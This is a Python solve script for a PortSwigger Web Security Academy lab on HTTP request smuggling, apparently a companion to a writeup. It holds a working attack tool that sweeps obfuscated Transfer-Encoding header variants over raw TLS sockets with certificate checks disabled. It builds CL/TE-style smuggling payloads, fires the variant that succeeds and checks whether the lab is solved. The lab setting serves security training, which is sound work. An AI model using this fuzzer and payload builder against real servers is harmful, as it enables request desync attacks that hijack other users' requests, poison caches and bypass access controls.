#!/usr/bin/env python3
"""
HTTP request smuggling, obfuscating the TE header
PortSwigger Web Security Academy -- HTTP Request Smuggling

Companion script for the writeup: 16-obfuscating-te-header.md

What this does:
    TE.TE obfuscation isn't a single payload -- it's a fuzzing problem. Both
    front-end and back-end support chunked encoding here, so smuggling only
    works if one of them can be tricked into not recognizing a
    Transfer-Encoding header that's technically present. This sweeps the
    same set of known obfuscation variants we tested (misspelling, spacing,
    duplication, case) against the standard GPOST-smuggling signal, then
    fires the one that worked -- a case-variation duplicate header -- as
    the final exploit.

Usage:
    python 16-obfuscating-te-header.py <lab-url>
    e.g. python 16-obfuscating-te-header.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import socket
import ssl
import sys
import time
from urllib.parse import urlparse

import httpx

# The exact obfuscation set we swept -- each is the raw header block that
# replaces the plain "Transfer-Encoding: chunked" line.
TE_OBFUSCATIONS = [
    "Transfer-Encoding: xchunked",
    "Transfer-Encoding : chunked",          # space before colon
    "Transfer-Encoding:\tchunked",          # tab instead of space
    " Transfer-Encoding: chunked",          # leading space
    "X: X\r\nTransfer-Encoding: chunked",   # newline prefix
    "Transfer-Encoding\r\n : chunked",      # line-wrapped
    "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",   # duplicate header
    "Transfer-Encoding: chunked\r\nTransfer-encoding: x",   # case variation (the one that worked)
    " Transfer-Encoding: chunked",          # space prefix
]


def create_ssl_connection(host: str, port: int = 443, timeout: float = 10.0) -> ssl.SSLSocket:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["http/1.1"])
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    return ctx.wrap_socket(sock, server_hostname=host)


def send_raw_keep_alive(host: str, payloads: list[bytes], port: int = 443,
                         timeout: float = 10.0, delay: float = 0.5) -> list[bytes]:
    ssl_sock = create_ssl_connection(host, port, timeout)
    responses = []
    try:
        for payload in payloads:
            ssl_sock.sendall(payload)
            time.sleep(delay)
            response = b""
            ssl_sock.settimeout(2.0)
            while True:
                try:
                    chunk = ssl_sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break
            responses.append(response)
        return responses
    finally:
        ssl_sock.close()


def build_tete_payload(host: str, smuggled_request: str, obfuscation: str,
                        path: str = "/", method: str = "POST") -> bytes:
    """CL.TE-style payload with the obfuscated Transfer-Encoding block
    substituted in place of a plain 'Transfer-Encoding: chunked' line."""
    body = "0\r\n\r\n" + smuggled_request
    headers = (
        f"{method} {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-length: {len(body)}\r\n"
        f"{obfuscation}\r\n"
        f"\r\n"
    )
    return (headers + body).encode()


def solve(lab_url: str) -> None:
    host = urlparse(lab_url).hostname
    smuggled = (
        "GPOST / HTTP/1.1\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 15\r\n"
        "\r\n"
        "x=1"
    )
    normal = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode()

    working = None
    for obf in TE_OBFUSCATIONS:
        attack = build_tete_payload(host, smuggled, obf)
        responses = send_raw_keep_alive(host, [attack, normal])
        signal = responses and (b"Unrecognized" in responses[-1] or b"403" in responses[-1])
        print(f"[*] Obfuscation {obf!r}: {'SIGNAL' if signal else 'no signal'}")
        if signal:
            working = obf
            break

    if not working:
        print("[-] No obfuscation variant produced a differential signal this run.")
        return

    print(f"[+] Working obfuscation: {working!r}")

    # Fire the confirmed exploit payload -- same GPOST smuggle, working obfuscation,
    # with the duplicate header's garbage value set to "cow" for the final send.
    final_obf = working.replace("Transfer-encoding: x", "Transfer-encoding: cow")
    attack = build_tete_payload(host, smuggled, final_obf)
    send_raw_keep_alive(host, [attack, normal])

    check = httpx.get(lab_url + "/", verify=False)
    if "is-solved" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Lab not yet marked solved -- re-run, the desync can need a couple of tries.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
